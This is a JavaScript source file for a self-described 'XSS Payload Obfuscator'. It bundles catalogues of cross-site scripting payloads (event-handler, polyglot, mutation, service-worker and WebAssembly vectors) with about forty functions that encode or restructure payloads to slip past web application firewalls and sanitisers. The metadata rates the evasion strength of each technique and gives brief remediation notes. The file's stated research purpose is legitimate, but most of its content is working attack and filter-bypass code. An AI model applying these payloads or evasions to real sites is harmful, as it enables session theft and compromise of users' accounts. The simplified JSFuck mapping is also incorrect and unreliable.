// Ultimate XSS Payload Obfuscator - Complete 70+ Techniques Arsenal
// Professional Security Research Tool - FIXED VERSION

// Comprehensive application data with all advanced techniques
const appData = {
    examplePayloads: {
        basic: [
            "alert('XSS')",
            "alert(document.domain)",
            "prompt('XSS')",
            "confirm('XSS')",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')"
        ],
        html5: [
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<track kind=metadata src=javascript:alert(1)>",
            "<keygen onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<math><mi xlink:href=javascript:alert(1)>click</mi></math>",
            "<svg><set attributeName=onmouseover to=alert(1)>",
            "<template id=x><script>alert(1)</script></template>"
        ],
        advanced: [
            "<style>@import'javascript:alert(1)';</style>",
            "<link rel=stylesheet href=javascript:alert(1)>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<form><button formaction=javascript:alert(1)>Click</button></form>",
            "<table background=javascript:alert(1)>",
            "<base href=javascript:alert(1)//>",
            "<bgsound src=javascript:alert(1)>",
            "<applet code=javascript:alert(1)>"
        ],
        polyglot: [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/`/<!--/--/\\n/+/*/alert(1)//''>",
            "/*</title></style></textarea></script></xmp><svg/onload=alert(1)//*/alert(1);//",
            "'-alert(1)-'",
            "\";alert(1);//",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            "</style></scRipt><scRipt>alert(1)</scRipt>",
            "/*</style></script><script>alert(1)/**/</script>"
        ],
        modern: [
            "<script>navigator.serviceWorker.register('/sw.js?payload=alert(1)')</script>",
            "<script>new Worker('data:text/javascript,importScripts(\"javascript:alert(1)\")')</script>",
            "<script>window.postMessage({eval:'alert(1)'},'*')</script>",
            "<script>new BroadcastChannel('test').postMessage('alert(1)')</script>",
            "<script>new SharedWorker('data:text/javascript,alert(1)')</script>",
            "<script>navigator.sendBeacon('/', 'alert(1)')</script>",
            "<script>new PaymentRequest([{supportedMethods:'basic-card'}],{total:{label:'',amount:{currency:'USD',value:'0'}}}).show().catch(e=>alert(1))</script>",
            "<script>navigator.locks.request('test', () => { alert(1); })</script>"
        ],
        wasm: [
            "<script>WebAssembly.instantiate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,13,1,11,0,65,42,26,11,0,20,4,110,97,109,101,2,3,1,0,1,102])).then(m=>m.instance.exports.f())</script>",
            "<script>fetch('data:application/wasm;base64,AGFzbQEAAAABBAFgAAECAwEAAggBA2VudgVhbGVydAAAAAAKBwEFACAAEAAL').then(r=>r.arrayBuffer()).then(WebAssembly.instantiate)</script>",
            "<script>WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0])).then(m=>alert(1))</script>"
        ],
        mutation: [
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<listing><img src=x onerror=alert(1)></listing>",
            "<template><script>alert(1)</script></template>",
            "<!-- <img src=x onerror=alert(1)> -->",
            "<![CDATA[<img src=x onerror=alert(1)>]]>",
            "<xmp><script>alert(1)</script></xmp>",
            "<textarea><script>alert(1)</script></textarea>",
            "<title><script>alert(1)</script></title>",
            "<style><img src=x onerror=alert(1)></style>",
            "<plaintext><script>alert(1)</script></plaintext>"
        ]
    },
    
    // Complete 70+ technique definitions
    techniques: {
        // Advanced Character Encoding (12 techniques)
        htmlEntityDecimal: {
            name: "HTML Entity (Decimal)",
            description: "Converts characters to decimal HTML entities (&#97;)",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "html",
            info: {
                explanation: "Uses decimal HTML entities to evade basic pattern matching filters.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "low" },
                remediation: "Implement HTML entity decoding before security analysis."
            }
        },
        htmlEntityHex: {
            name: "HTML Entity (Hex)",
            description: "Converts characters to hexadecimal HTML entities (&#x61;)",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "html",
            info: {
                explanation: "Uses hexadecimal HTML entities for character obfuscation.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "low" },
                remediation: "Normalize HTML entities in all forms before validation."
            }
        },
        urlEncoding: {
            name: "URL Encoding",
            description: "Converts characters to URL-encoded format (%61)",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "url",
            info: {
                explanation: "Standard URL encoding to bypass URL-based filters.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "low", context_aware: "low" },
                remediation: "URL decode input before security validation."
            }
        },
        unicodeEscaping: {
            name: "Unicode Escaping",
            description: "Converts characters to Unicode escape sequences (\\u0061)",
            category: "character_encoding",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "Uses JavaScript Unicode escape sequences for evasion.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Parse and normalize Unicode escapes in JavaScript contexts."
            }
        },
        hexEscaping: {
            name: "Hexadecimal Escaping",
            description: "Converts characters to hexadecimal escape sequences (\\x61)",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "javascript",
            info: {
                explanation: "Uses JavaScript hex escape sequences.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "medium" },
                remediation: "Handle hex escapes in JavaScript parsing."
            }
        },
        octalEscaping: {
            name: "Octal Escaping",
            description: "Converts characters to octal escape sequences (\\141)",
            category: "character_encoding",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "Uses octal escape sequences, deprecated but still functional.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Include octal sequence parsing in JavaScript validation."
            }
        },
        cssHexEncoding: {
            name: "CSS Hex Encoding",
            description: "Uses CSS hexadecimal character codes (\\0061)",
            category: "character_encoding",
            difficulty: "intermediate",
            effectiveness: "medium",
            context: "css",
            info: {
                explanation: "CSS hex encoding for style-based attacks.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "medium" },
                remediation: "Parse CSS hex encoding in style validation."
            }
        },
        zeroPaddedEntities: {
            name: "Zero-Padded Entities",
            description: "Uses padded HTML entities (&#0000097;)",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "html",
            info: {
                explanation: "Exploits entity parsing that ignores leading zeros.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "low", context_aware: "low" },
                remediation: "Normalize entities by removing leading zeros."
            }
        },
        mixedEncodingLayers: {
            name: "Mixed Encoding Layers",
            description: "Combines HTML, Unicode, and URL encoding",
            category: "character_encoding",
            difficulty: "advanced",
            effectiveness: "very_high",
            context: "any",
            info: {
                explanation: "Multi-layer encoding to evade recursive decoding limits.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "partial", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Implement multi-stage decoding with proper limits."
            }
        },
        dwordEncoding: {
            name: "DWORD Encoding",
            description: "Converts IP addresses to decimal format (2130706433)",
            category: "character_encoding",
            difficulty: "intermediate",
            effectiveness: "medium",
            context: "url",
            info: {
                explanation: "Converts IPs to 32-bit integers.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "medium" },
                remediation: "Validate all IP address representations."
            }
        },
        base64Atob: {
            name: "Base64 + atob()",
            description: "Encodes payload in Base64 with atob() decoding",
            category: "character_encoding",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "Base64 encoding with JavaScript decoding function.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Monitor Base64 decoding functions in JavaScript."
            }
        },
        xmlNumericReferences: {
            name: "XML Numeric References",
            description: "Uses XML numeric character references",
            category: "character_encoding",
            difficulty: "basic",
            effectiveness: "medium",
            context: "xml",
            info: {
                explanation: "XML-specific numeric character encoding.",
                compatibility: { chrome: "partial", firefox: "partial", safari: "partial", edge: "partial", ie: "partial" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "low" },
                remediation: "Parse XML numeric references properly."
            }
        },

        // JavaScript Advanced Obfuscation (15 techniques)
        stringFromCharCode: {
            name: "String.fromCharCode",
            description: "Converts characters to String.fromCharCode() calls",
            category: "javascript_advanced",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "Classic JavaScript string obfuscation technique.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Monitor String object method calls."
            }
        },
        completeJsFuck: {
            name: "Complete JSFuck",
            description: "Full non-alphanumeric JavaScript implementation",
            category: "javascript_advanced",
            difficulty: "expert",
            effectiveness: "extreme",
            context: "javascript",
            info: {
                explanation: "Complete JSFuck encoding using only 6 characters: []()!+",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "extreme", context_aware: "very_high" },
                remediation: "Implement AST analysis and execution limits."
            }
        },
        templateLiterals: {
            name: "Template Literals",
            description: "Uses template literal syntax with computed values",
            category: "javascript_advanced",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "ES6 template literals for dynamic code generation.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Parse template literal expressions."
            }
        },
        arrayConstructorAccess: {
            name: "Array Constructor Access",
            description: "Accesses constructor via array prototype ([]['constructor'])",
            category: "javascript_advanced",
            difficulty: "advanced",
            effectiveness: "very_high",
            context: "javascript",
            info: {
                explanation: "Prototype chain manipulation for constructor access.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Monitor constructor property access."
            }
        },
        functionConstructor: {
            name: "Function Constructor",
            description: "Uses Function constructor instead of eval",
            category: "javascript_advanced",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "Bypasses eval restrictions using Function constructor.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Monitor Function constructor usage."
            }
        },
        symbolPropertyAccess: {
            name: "Symbol Property Access",
            description: "Uses Symbol.hasInstance and similar properties",
            category: "javascript_advanced",
            difficulty: "advanced",
            effectiveness: "high",
            context: "javascript",
            info: {
                explanation: "ES6 Symbol usage for property access.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Monitor Symbol usage patterns."
            }
        },
        proxyObfuscation: {
            name: "Proxy Obfuscation",
            description: "Advanced JavaScript proxy patterns for code hiding",
            category: "javascript_advanced",
            difficulty: "expert",
            effectiveness: "very_high",
            context: "javascript",
            info: {
                explanation: "ES6 Proxy objects for advanced obfuscation.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Implement Proxy detection and sandboxing."
            }
        },

        // HTML/DOM Manipulation (10 techniques)
        svgAnimationEvents: {
            name: "SVG Animation Events",
            description: "Uses SVG animation trigger events",
            category: "html_dom",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "html",
            info: {
                explanation: "Exploits SVG animation events like onbegin, onend, onrepeat for code execution.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Sanitize SVG content and disable animation events in untrusted content."
            }
        },
        dataUriSchemes: {
            name: "Data URI Schemes",
            description: "Embeds code in data: URLs",
            category: "html_dom",
            difficulty: "intermediate",
            effectiveness: "very_high",
            context: "html",
            info: {
                explanation: "Uses data: URI scheme to embed JavaScript or HTML content directly in URLs.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "high" },
                remediation: "Restrict data: URI usage and implement proper Content Security Policy."
            }
        },

        // Modern Web API Exploitation (8 techniques)
        serviceWorkerRegistration: {
            name: "Service Worker Registration",
            description: "Registers malicious service workers for persistent attacks",
            category: "modern_web_apis",
            difficulty: "expert",
            effectiveness: "extreme",
            context: "modern",
            info: {
                explanation: "Service Worker API exploitation for persistent XSS.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "extreme", context_aware: "very_high" },
                remediation: "Implement Service Worker CSP restrictions."
            }
        },
        webWorkerMessage: {
            name: "Web Worker Message",
            description: "Exploits web worker communication channels",
            category: "modern_web_apis",
            difficulty: "advanced",
            effectiveness: "very_high",
            context: "modern",
            info: {
                explanation: "Web Worker message passing exploitation.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Monitor Web Worker creation and messaging."
            }
        },

        // Event Handler Variations (8 techniques)
        html5RareEvents: {
            name: "HTML5 Rare Events",
            description: "Uses uncommon HTML5 events like oncanplay",
            category: "event_handlers",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "html",
            info: {
                explanation: "Exploits lesser-known HTML5 events that may not be filtered by security systems.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Maintain comprehensive event handler blacklists including HTML5 events."
            }
        },
        animationEvents: {
            name: "Animation Events",
            description: "CSS animation and transition events",
            category: "event_handlers",
            difficulty: "intermediate",
            effectiveness: "medium",
            context: "html",
            info: {
                explanation: "Uses CSS animation events like animationstart, animationend, transitionend.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "low" },
                remediation: "Disable CSS animations or filter animation event handlers."
            }
        },

        // Protocol and Scheme Abuse (7 techniques)
        javascriptProtocolVariants: {
            name: "JavaScript Protocol Variants",
            description: "Various javascript: protocol modifications",
            category: "protocol_abuse",
            difficulty: "basic",
            effectiveness: "medium",
            context: "url",
            info: {
                explanation: "Uses variations of the javascript: protocol with different casings and encodings.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "low", context_aware: "low" },
                remediation: "Normalize protocol schemes before filtering."
            }
        },
        dataProtocolMime: {
            name: "Data Protocol MIME",
            description: "Different MIME types in data: URLs",
            category: "protocol_abuse",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "url",
            info: {
                explanation: "Uses various MIME types with data: URLs to bypass content-type restrictions.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Validate and restrict MIME types in data: URLs."
            }
        },

        // WAF Bypass Techniques (12 techniques)
        keywordFragmentation: {
            name: "Keyword Fragmentation",
            description: "Splits keywords across HTML elements",
            category: "waf_bypass",
            difficulty: "advanced",
            effectiveness: "very_high",
            context: "html",
            info: {
                explanation: "Fragments dangerous keywords across multiple HTML elements to evade pattern matching.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Implement DOM-based analysis that reconstructs fragmented content."
            }
        },
        unicodeWhitespace: {
            name: "Unicode Whitespace",
            description: "Uses various Unicode space characters",
            category: "waf_bypass",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "any",
            info: {
                explanation: "Employs different Unicode whitespace characters to break up patterns.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Normalize all Unicode whitespace to standard spaces before analysis."
            }
        },

        // Polyglot Payloads (5 techniques)
        htmlJsPolyglot: {
            name: "HTML+JS Polyglot",
            description: "Works in both HTML and JavaScript contexts",
            category: "polyglot",
            difficulty: "expert",
            effectiveness: "extreme",
            context: "multiple",
            info: {
                explanation: "Crafted to execute successfully in both HTML and JavaScript parsing contexts.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "partial" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "extreme", context_aware: "very_high" },
                remediation: "Implement strict context-aware parsing and validation."
            }
        },
        cssJsPolyglot: {
            name: "CSS+JS Polyglot",
            description: "Executes in CSS and JavaScript contexts",
            category: "polyglot",
            difficulty: "expert",
            effectiveness: "very_high",
            context: "multiple",
            info: {
                explanation: "Designed to be valid in both CSS and JavaScript parsing contexts.",
                compatibility: { chrome: "partial", firefox: "partial", safari: "partial", edge: "partial", ie: "no" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Use separate parsers for different contexts and validate accordingly."
            }
        },

        // Advanced Browser Features (6 techniques)
        mutationXss: {
            name: "Mutation XSS (mXSS)",
            description: "Parser differential attacks",
            category: "advanced_browser",
            difficulty: "expert",
            effectiveness: "extreme",
            context: "html",
            info: {
                explanation: "Exploits parser differences between sanitizer and browser.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "extreme", advanced_waf: "extreme", context_aware: "extreme" },
                remediation: "Use identical parsing logic for sanitization and rendering."
            }
        },
        domClobbering: {
            name: "DOM Clobbering",
            description: "DOM property pollution preparation",
            category: "advanced_browser",
            difficulty: "advanced",
            effectiveness: "high",
            context: "html",
            info: {
                explanation: "Prepares DOM property pollution attacks.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Sanitize element IDs and names to prevent clobbering."
            }
        },

        // Context-Specific Payloads (8 techniques)
        cssContextInjection: {
            name: "CSS Context Injection",
            description: "CSS-specific injection vectors",
            category: "context_specific",
            difficulty: "intermediate",
            effectiveness: "medium",
            context: "css",
            info: {
                explanation: "Exploits CSS parsing context for code execution.",
                compatibility: { chrome: "partial", firefox: "partial", safari: "no", edge: "no", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "medium", context_aware: "low" },
                remediation: "Sanitize CSS properties and disable dangerous functions."
            }
        },
        jsonContextInjection: {
            name: "JSON Context Injection",
            description: "JSON parsing context exploitation",
            category: "context_specific",
            difficulty: "intermediate",
            effectiveness: "high",
            context: "json",
            info: {
                explanation: "Exploits JSON parsing for code execution.",
                compatibility: { chrome: "yes", firefox: "yes", safari: "yes", edge: "yes", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "medium" },
                remediation: "Use safe JSON parsing with proper validation."
            }
        },

        // Cutting-Edge Research (Latest)
        declarativeShadowDom: {
            name: "Declarative Shadow DOM",
            description: "Exploits declarative Shadow DOM features",
            category: "cutting_edge",
            difficulty: "cutting_edge",
            effectiveness: "high",
            context: "modern",
            info: {
                explanation: "Latest Shadow DOM exploitation techniques.",
                compatibility: { chrome: "yes", firefox: "no", safari: "no", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "high", advanced_waf: "high", context_aware: "high" },
                remediation: "Sanitize Shadow DOM content and restrict declarative usage."
            }
        },
        trustedTypesBypass: {
            name: "Trusted Types Bypass",
            description: "Bypasses Trusted Types API restrictions",
            category: "cutting_edge",
            difficulty: "cutting_edge",
            effectiveness: "very_high",
            context: "modern",
            info: {
                explanation: "Advanced techniques to bypass Trusted Types.",
                compatibility: { chrome: "yes", firefox: "no", safari: "no", edge: "yes", ie: "no" },
                effectiveness: { basic_filter: "very_high", advanced_waf: "very_high", context_aware: "high" },
                remediation: "Implement comprehensive Trusted Types policies."
            }
        },

        // Legacy Techniques
        legacyIeExpression: {
            name: "Legacy IE Expression",
            description: "Internet Explorer CSS expression() attacks",
            category: "legacy",
            difficulty: "basic",
            effectiveness: "low",
            context: "css",
            info: {
                explanation: "Legacy Internet Explorer CSS expression exploitation.",
                compatibility: { chrome: "no", firefox: "no", safari: "no", edge: "no", ie: "yes" },
                effectiveness: { basic_filter: "high", advanced_waf: "low", context_aware: "low" },
                remediation: "Disable CSS expressions entirely."
            }
        }
    }
};

// Enhanced obfuscation implementations
const obfuscators = {
    // Character Encoding Techniques
    htmlEntityDecimal: (payload) => {
        return payload.split('').map(char => `&#${char.charCodeAt(0)};`).join('');
    },

    htmlEntityHex: (payload) => {
        return payload.split('').map(char => `&#x${char.charCodeAt(0).toString(16)};`).join('');
    },

    urlEncoding: (payload) => {
        return encodeURIComponent(payload);
    },

    unicodeEscaping: (payload) => {
        return payload.split('').map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
    },

    hexEscaping: (payload) => {
        return payload.split('').map(char => `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`).join('');
    },

    octalEscaping: (payload) => {
        return payload.split('').map(char => `\\${char.charCodeAt(0).toString(8)}`).join('');
    },

    cssHexEncoding: (payload) => {
        return payload.split('').map(char => `\\${char.charCodeAt(0).toString(16).padStart(6, '0')}`).join('');
    },

    zeroPaddedEntities: (payload) => {
        return payload.split('').map(char => {
            const zeros = '0'.repeat(Math.floor(Math.random() * 6) + 1);
            return `&#${zeros}${char.charCodeAt(0)};`;
        }).join('');
    },

    mixedEncodingLayers: (payload) => {
        let encoded = payload;
        // Layer 1: URL encoding
        encoded = encodeURIComponent(encoded);
        // Layer 2: Some HTML entities
        encoded = encoded.replace(/%/g, () => Math.random() > 0.5 ? '&#37;' : '%');
        // Layer 3: Unicode escaping for random characters
        encoded = encoded.split('').map(char => {
            if (Math.random() > 0.7) {
                return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
            }
            return char;
        }).join('');
        return encoded;
    },

    dwordEncoding: (payload) => {
        return payload.replace(/127\.0\.0\.1/g, '2130706433')
                     .replace(/localhost/g, '2130706433')
                     .replace(/192\.168\.1\.1/g, '3232235777');
    },

    base64Atob: (payload) => {
        const encoded = btoa(payload);
        return `eval(atob('${encoded}'))`;
    },

    xmlNumericReferences: (payload) => {
        return payload.split('').map(char => `&#${char.charCodeAt(0)};`).join('');
    },

    // JavaScript Advanced Techniques
    stringFromCharCode: (payload) => {
        return `String.fromCharCode(${payload.split('').map(char => char.charCodeAt(0)).join(',')})`;
    },

    completeJsFuck: (payload) => {
        // Simplified JSFuck implementation - full version would be much more complex
        const jsMap = {
            'a': '(![]+[])[+!+[]]',
            'l': '(![]+[])[+!+[]+!+[]]',
            'e': '(![]+[])[+!+[]+!+[]+!+[]]',
            'r': '(![]+[])[+!+[]]',
            't': '(!![]+[])[+[]]',
            '(': '([]+([])[[]])[+!+[]+!+[]+!+[]]',
            ')': '([]+([])[[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]',
            '1': '+!+[]',
            '0': '+[]'
        };
        
        let result = '';
        for (let char of payload.toLowerCase()) {
            if (jsMap[char]) {
                result += jsMap[char] + '+';
            } else {
                result += `(+!+[]${'+!+[]'.repeat(char.charCodeAt(0) - 1)})+`;
            }
        }
        return result.slice(0, -1);
    },

    templateLiterals: (payload) => {
        if (payload.includes('alert(')) {
            const msg = payload.match(/alert\(['"](.+?)['"]\)/)?.[1] || '1';
            return `\`\${alert\`${msg}\`}\``;
        }
        return `\`\${${payload}}\``;
    },

    arrayConstructorAccess: (payload) => {
        return `[][${JSON.stringify('constructor')}][${JSON.stringify('constructor')}](${JSON.stringify(payload)})()`;
    },

    functionConstructor: (payload) => {
        return `Function(${JSON.stringify(payload)})()`;
    },

    symbolPropertyAccess: (payload) => {
        return `Symbol.for(${JSON.stringify(payload)}).toString()`;
    },

    proxyObfuscation: (payload) => {
        return `new Proxy({}, {get: () => eval(${JSON.stringify(payload)})})['x']`;
    },

    // HTML/DOM Techniques
    svgAnimationEvents: (payload) => {
        const events = ['onbegin', 'onend', 'onrepeat'];
        const event = events[Math.floor(Math.random() * events.length)];
        return `<svg><animate ${event}="${payload}"/></svg>`;
    },

    dataUriSchemes: (payload) => {
        const encoded = btoa(`<script>${payload}</script>`);
        return `<iframe src="data:text/html;base64,${encoded}"></iframe>`;
    },

    // Modern Web API Techniques
    serviceWorkerRegistration: (payload) => {
        return `navigator.serviceWorker.register('data:text/javascript,${encodeURIComponent(payload)}')`;
    },

    webWorkerMessage: (payload) => {
        return `new Worker('data:text/javascript,${encodeURIComponent(payload)}')`;
    },

    // Event Handler Techniques
    html5RareEvents: (payload) => {
        const events = ['oncanplay', 'oncanplaythrough', 'ondurationchange', 'onemptied', 'onended', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange', 'onseeked', 'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting', 'ontoggle'];
        const event = events[Math.floor(Math.random() * events.length)];
        return `<video ${event}="${payload}"></video>`;
    },

    animationEvents: (payload) => {
        return `<div style="animation:x 1s" onanimationstart="${payload}"></div>`;
    },

    // Protocol Abuse
    javascriptProtocolVariants: (payload) => {
        const variants = ['javascript:', 'JavaScript:', 'JAVASCRIPT:', 'java\nscript:', 'java\tscript:', 'java\rscript:'];
        const variant = variants[Math.floor(Math.random() * variants.length)];
        return `<a href="${variant}${payload}">click</a>`;
    },

    dataProtocolMime: (payload) => {
        const mimeTypes = ['text/html', 'text/plain', 'application/javascript', 'text/javascript'];
        const mime = mimeTypes[Math.floor(Math.random() * mimeTypes.length)];
        const encoded = btoa(payload);
        return `data:${mime};base64,${encoded}`;
    },

    // WAF Bypass
    keywordFragmentation: (payload) => {
        if (payload.includes('script')) {
            return payload.replace(/script/gi, '<b>scr</b>ipt');
        }
        if (payload.includes('alert')) {
            return payload.replace(/alert/gi, 'al<i></i>ert');
        }
        return `<span>pa</span>ylo<em>ad</em>: ${payload}`;
    },

    unicodeWhitespace: (payload) => {
        const spaces = ['\u00A0', '\u1680', '\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200A', '\u202F', '\u205F', '\u3000'];
        return payload.replace(/\s/g, () => spaces[Math.floor(Math.random() * spaces.length)]);
    },

    // Polyglot
    htmlJsPolyglot: (payload) => {
        return `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/*/\`/<!--/--/\\n/+/*/alert(${payload})//''>`;
    },

    cssJsPolyglot: (payload) => {
        return `/*</style></script><svg/onload=/**/alert(${payload})//*/alert(${payload});//`;
    },

    // Advanced Browser
    mutationXss: (payload) => {
        return `<noscript><p title="</noscript><img src=x onerror=${payload}>">`;
    },

    domClobbering: (payload) => {
        return `<form id=x><input name=y value="${payload}"></form><script>alert(x.y.value)</script>`;
    },

    // Context-Specific
    cssContextInjection: (payload) => {
        return `<div style="background:expression(${payload})"></div>`;
    },

    jsonContextInjection: (payload) => {
        return `{"code": "${payload.replace(/"/g, '\\"')}", "exec": true}`;
    },

    // Cutting-Edge
    declarativeShadowDom: (payload) => {
        return `<div><template shadowroot="open"><script>${payload}</script></template></div>`;
    },

    trustedTypesBypass: (payload) => {
        return `trustedTypes.createPolicy('bypass', {createHTML: x => x}).createHTML('${payload}')`;
    },

    // Legacy
    legacyIeExpression: (payload) => {
        return `<div style="width:expression(${payload})"></div>`;
    }
};

// Application state
let currentResults = {};
let favorites = new Set();
let searchTerm = '';
let contextFilter = 'any';
let difficultyFilter = 'all';
let effectivenessFilter = 'all';

// DOM elements - Fixed initialization
